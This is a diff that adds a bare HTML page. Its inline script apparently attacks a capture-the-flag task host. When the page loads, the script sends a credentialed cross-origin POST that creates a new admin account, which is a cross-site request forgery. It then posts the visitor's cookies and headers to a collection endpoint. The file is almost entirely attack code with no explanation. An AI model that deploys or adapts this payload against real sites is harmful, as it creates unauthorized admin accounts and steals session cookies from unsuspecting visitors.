@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+    <script>
+        fetch('https://tasks.goidactf.ru:20079/create_admin',
+{
+    method:'POST',
+    headers:{
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin':'https://tasks.goidactf.ru:20079'
+        },
+    credentials:'include',
+    mode:'cors',
+    body:'new_admin_login=juuzo'
+}).then(r=>r.text()).then(text=>{
+fetch('/append',{
+    method:'POST',
+    headers:{
+        'Content-Type': 'application/json'
+    },
+    body:JSON.stringify({
+        cookie:document.cookie,
+        headers:Object.fromEntries([...new Headers(document.headers || {})]),
+        ip:null
+    })
+})
+})
+    </script>
+</body>
+</html>
